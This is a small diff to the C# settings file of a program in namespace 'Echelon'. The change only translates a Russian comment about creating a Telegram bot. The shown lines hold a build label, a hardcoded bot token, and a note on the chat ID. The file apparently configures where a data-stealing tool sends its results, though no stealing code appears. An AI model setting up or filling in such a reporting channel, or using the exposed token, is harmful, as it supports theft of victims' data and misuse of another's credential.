@@ -18,7 +18,7 @@ namespace Echelon
         // Уникальный идентификатор билда, опционально.
         public static string buildversion = "V5 MyBuild"; 
 
-        //Токен бота в телеге, создать бота и получить токен тут: @BotFather
+        //Токен бота в Telegram, создать бота и получить токен тут: @BotFather
         public static string Token = "1283332434:AAFwg3x7sG10_Z75Ntawy55ceVzC8gggAyL4";
 
         // Telegram ID чата, узнать свой ID чата можно тут: @my_id_bot
